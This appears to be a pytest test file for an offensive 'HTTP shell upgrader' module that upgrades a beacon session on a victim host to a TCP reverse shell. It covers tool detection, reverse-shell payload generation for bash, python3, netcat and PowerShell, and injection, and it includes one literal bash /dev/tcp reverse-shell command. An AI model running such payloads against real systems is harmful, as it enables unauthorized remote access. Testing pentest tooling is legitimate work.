"""
Tests for HTTP shell upgrader.

Test Coverage:
- Capability detection
- Payload generation
- Payload injection
- TCP listener management
- Upgrade workflow
"""

import pytest
import socket
import time
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path

from crack.sessions.shell.http_upgrader import HTTPShellUpgrader
from crack.sessions.models import Session


@pytest.fixture
def mock_session_manager():
    """Mock SessionManager"""
    manager = Mock()
    manager.create_session = Mock()
    manager.update_session = Mock()
    manager.get_session = Mock()
    return manager


@pytest.fixture
def mock_http_listener():
    """Mock HTTPListener"""
    listener = Mock()
    listener.send_command = Mock()
    listener.get_all_responses = Mock(return_value=[])
    return listener


@pytest.fixture
def http_upgrader(mock_session_manager, mock_http_listener):
    """Create HTTP upgrader fixture"""
    return HTTPShellUpgrader(mock_session_manager, mock_http_listener)


@pytest.fixture
def http_session():
    """Create test HTTP session"""
    return Session(
        id='test-http-123',
        type='http',
        target='192.168.45.150',
        port=8080,
        protocol='beacon',
        shell_type='bash',
        metadata={'hostname': 'victim-pc'}
    )


class TestCapabilityDetection:
    """Test capability detection"""

    def test_detect_linux_capabilities(self, http_upgrader, mock_http_listener):
        """Test detecting Linux system capabilities"""
        # Mock responses
        mock_http_listener.get_all_responses.return_value = [
            {'output': 'Linux'},  # uname -s
            {'output': '/bin/bash'},  # echo $SHELL
            {'output': ''},  # python
            {'output': '/usr/bin/python3'},  # python3
            {'output': '/usr/bin/nc'},  # nc
            {'output': '/usr/bin/perl'},  # perl
            {'output': ''},  # php
            {'output': ''},  # ruby
            {'output': ''}  # powershell
        ]

        capabilities = http_upgrader.detect_capabilities('test-123')

        assert capabilities['os'] == 'Linux'
        assert capabilities['shell_type'] == 'bash'
        assert 'python3' in capabilities['detected_tools']
        assert 'nc' in capabilities['detected_tools']
        assert 'perl' in capabilities['detected_tools']
        assert capabilities['recommended_payload'] == 'python3'

    def test_detect_windows_capabilities(self, http_upgrader, mock_http_listener):
        """Test detecting Windows system capabilities"""
        mock_http_listener.get_all_responses.return_value = [
            {'output': 'Windows'},  # os
            {'output': 'C:\\Windows\\System32\\cmd.exe'},  # shell
            {'output': ''},  # python
            {'output': ''},  # python3
            {'output': ''},  # nc
            {'output': ''},  # perl
            {'output': ''},  # php
            {'output': ''},  # ruby
            {'output': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}  # powershell
        ]

        capabilities = http_upgrader.detect_capabilities('test-123')

        assert capabilities['os'] == 'Windows'
        assert 'powershell' in capabilities['detected_tools']
        assert capabilities['recommended_payload'] == 'powershell'

    def test_detect_minimal_capabilities(self, http_upgrader, mock_http_listener):
        """Test detecting minimal capabilities (bash only)"""
        mock_http_listener.get_all_responses.return_value = [
            {'output': 'Linux'},
            {'output': '/bin/sh'},
            {'output': ''}, {'output': ''}, {'output': ''},
            {'output': ''}, {'output': ''}, {'output': ''},
            {'output': ''}
        ]

        capabilities = http_upgrader.detect_capabilities('test-123')

        assert capabilities['os'] == 'Linux'
        assert capabilities['shell_type'] == 'sh'
        assert len(capabilities['detected_tools']) == 0
        assert capabilities['recommended_payload'] == 'bash'


class TestPayloadGeneration:
    """Test reverse shell payload generation"""

    def test_generate_bash_payload(self, http_upgrader):
        """Test bash reverse shell payload"""
        payload = http_upgrader.generate_reverse_shell_payload(
            'bash',
            '192.168.45.150',
            4444
        )

        assert '192.168.45.150' in payload
        assert '4444' in payload
        assert 'bash' in payload
        assert '/dev/tcp' in payload

    def test_generate_python3_payload(self, http_upgrader):
        """Test python3 reverse shell payload"""
        payload = http_upgrader.generate_reverse_shell_payload(
            'python3',
            '192.168.45.150',
            4444
        )

        assert '192.168.45.150' in payload
        assert '4444' in payload
        assert 'python3' in payload
        assert 'socket' in payload

    def test_generate_netcat_payload(self, http_upgrader):
        """Test netcat reverse shell payload"""
        payload = http_upgrader.generate_reverse_shell_payload(
            'nc_e',
            '192.168.45.150',
            4444
        )

        assert '192.168.45.150' in payload
        assert '4444' in payload
        assert 'nc' in payload

    def test_generate_powershell_payload(self, http_upgrader):
        """Test PowerShell reverse shell payload"""
        payload = http_upgrader.generate_reverse_shell_payload(
            'powershell',
            '192.168.45.150',
            4444
        )

        assert '192.168.45.150' in payload
        assert '4444' in payload
        assert 'TCPClient' in payload or 'Net.Sockets' in payload

    def test_unsupported_payload_type(self, http_upgrader):
        """Test error on unsupported payload type"""
        with pytest.raises(ValueError, match="Unsupported payload type"):
            http_upgrader.generate_reverse_shell_payload(
                'invalid',
                '192.168.45.150',
                4444
            )


class TestPayloadInjection:
    """Test payload injection"""

    def test_inject_payload(self, http_upgrader, mock_http_listener):
        """Test injecting payload via beacon"""
        result = http_upgrader.inject_payload(
            'test-123',
            'bash -i >& /dev/tcp/192.168.45.150/4444 0>&1',
            background=True
        )

        assert result is True
        mock_http_listener.send_command.assert_called_once()

        # Verify command was sent with background operator
        call_args = mock_http_listener.send_command.call_args
        assert call_args[0][0] == 'test-123'
        assert '&' in call_args[0][1]  # Should have background operator

    def test_inject_payload_foreground(self, http_upgrader, mock_http_listener):
        """Test injecting payload without background"""
        result = http_upgrader.inject_payload(
            'test-123',
            'whoami',
            background=False
        )

        assert result is True
        call_args = mock_http_listener.send_command.call_args
        assert call_args[0][1] == 'whoami'  # No background operator


class TestTCPListener:
    """Test TCP listener management"""

    def test_start_tcp_listener_timeout(self, http_upgrader):
        """Test TCP listener with timeout (no connection)"""
        client_socket, client_address = http_upgrader.start_tcp_listener(
            '127.0.0.1',
            9999,
            timeout=1  # Short timeout for testing
        )

        assert client_socket is None
        assert client_address is None

    @patch('socket.socket')
    def test_start_tcp_listener_connection(self, mock_socket_class, http_upgrader):
        """Test TCP listener receives connection"""
        # Mock socket
        mock_server = Mock()
        mock_client = Mock()
        mock_server.accept.return_value = (mock_client, ('192.168.45.150', 12345))
        mock_socket_class.return_value = mock_server

        client_socket, client_address = http_upgrader.start_tcp_listener(
            '127.0.0.1',
            4444,
            timeout=30
        )

        assert client_socket == mock_client
        assert client_address == ('192.168.45.150', 12345)


class TestUpgradeWorkflow:
    """Test complete upgrade workflow"""

    @patch('crack.sessions.shell.http_upgrader.threading.Thread')
    def test_upgrade_to_tcp_with_payload_type(
        self,
        mock_thread_class,
        http_upgrader,
        mock_session_manager,
        mock_http_listener,
        http_session
    ):
        """Test upgrade workflow with specified payload type"""
        # Setup mocks
        mock_session_manager.get_session.return_value = http_session

        # Mock TCP session creation
        tcp_session = Session(
            id='test-tcp-456',
            type='tcp',
            target='192.168.45.150',
            port=4444,
            protocol='reverse'
        )
        mock_session_manager.create_session.return_value = tcp_session

        # Mock thread (simulate successful connection)
        mock_thread = Mock()
        mock_thread_class.return_value = mock_thread

        # Mock connection result
        with patch.object(http_upgrader, 'start_tcp_listener') as mock_listener:
            mock_client = Mock()
            mock_listener.return_value = (mock_client, ('192.168.45.150', 12345))

            # Run upgrade
            result = http_upgrader.upgrade_to_tcp(
                http_session_id='test-http-123',
                lhost='192.168.45.150',
                lport=4444,
                payload_type='python3',
                timeout=30
            )

            # Verify session was marked as upgrading
            assert mock_session_manager.update_session.called

            # Verify payload was injected
            assert mock_http_listener.send_command.called

            # Verify TCP session was created
            assert mock_session_manager.create_session.called

            # Verify result
            assert result == tcp_session

    def test_upgrade_to_tcp_session_not_found(
        self,
        http_upgrader,
        mock_session_manager
    ):
        """Test upgrade fails if session not found"""
        mock_session_manager.get_session.return_value = None

        with pytest.raises(ValueError, match="Session .* not found"):
            http_upgrader.upgrade_to_tcp(
                http_session_id='nonexistent',
                lhost='192.168.45.150',
                lport=4444
            )


class TestPayloadInfo:
    """Test payload information retrieval"""

    def test_list_available_payloads(self, http_upgrader):
        """Test listing all payloads"""
        payloads = http_upgrader.list_available_payloads()

        assert 'bash' in payloads
        assert 'python3' in payloads
        assert 'nc_e' in payloads
        assert 'powershell' in payloads
        assert len(payloads) > 5

    def test_get_payload_info_bash(self, http_upgrader):
        """Test getting bash payload info"""
        info = http_upgrader.get_payload_info('bash')

        assert info is not None
        assert info['type'] == 'bash'
        assert info['os'] == 'Linux'
        assert 'bash' in info['requirements']

    def test_get_payload_info_python3(self, http_upgrader):
        """Test getting python3 payload info"""
        info = http_upgrader.get_payload_info('python3')

        assert info is not None
        assert info['type'] == 'python3'
        assert info['os'] == 'Linux'
        assert 'python3' in info['requirements']

    def test_get_payload_info_powershell(self, http_upgrader):
        """Test getting PowerShell payload info"""
        info = http_upgrader.get_payload_info('powershell')

        assert info is not None
        assert info['type'] == 'powershell'
        assert info['os'] == 'Windows'
        assert 'powershell' in info['requirements']

    def test_get_payload_info_invalid(self, http_upgrader):
        """Test getting info for invalid payload"""
        info = http_upgrader.get_payload_info('invalid')

        assert info is None


class TestEdgeCases:
    """Test edge cases"""

    def test_upgrade_with_auto_detect(
        self,
        http_upgrader,
        mock_session_manager,
        mock_http_listener,
        http_session
    ):
        """Test upgrade with auto-detection"""
        mock_session_manager.get_session.return_value = http_session

        # Mock capability detection
        with patch.object(http_upgrader, 'detect_capabilities') as mock_detect:
            mock_detect.return_value = {
                'os': 'Linux',
                'shell_type': 'bash',
                'detected_tools': ['python3'],
                'recommended_payload': 'python3'
            }

            # Mock connection (will fail but we just want to test auto-detect)
            with patch.object(http_upgrader, 'start_tcp_listener') as mock_listener:
                mock_listener.return_value = (None, None)

                try:
                    http_upgrader.upgrade_to_tcp(
                        http_session_id='test-http-123',
                        lhost='192.168.45.150',
                        lport=4444,
                        payload_type=None,  # Auto-detect
                        timeout=1
                    )
                except RuntimeError:
                    pass  # Expected (no connection)

                # Verify detection was called
                mock_detect.assert_called_once_with('test-http-123')

    def test_upgrade_no_recommended_payload(
        self,
        http_upgrader,
        mock_session_manager,
        mock_http_listener,
        http_session
    ):
        """Test upgrade fails if no recommended payload"""
        mock_session_manager.get_session.return_value = http_session

        with patch.object(http_upgrader, 'detect_capabilities') as mock_detect:
            mock_detect.return_value = {
                'os': 'unknown',
                'shell_type': 'unknown',
                'detected_tools': [],
                'recommended_payload': None
            }

            with pytest.raises(RuntimeError, match="Could not determine appropriate payload type"):
                http_upgrader.upgrade_to_tcp(
                    http_session_id='test-http-123',
                    lhost='192.168.45.150',
                    lport=4444,
                    payload_type=None,
                    timeout=1
                )


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
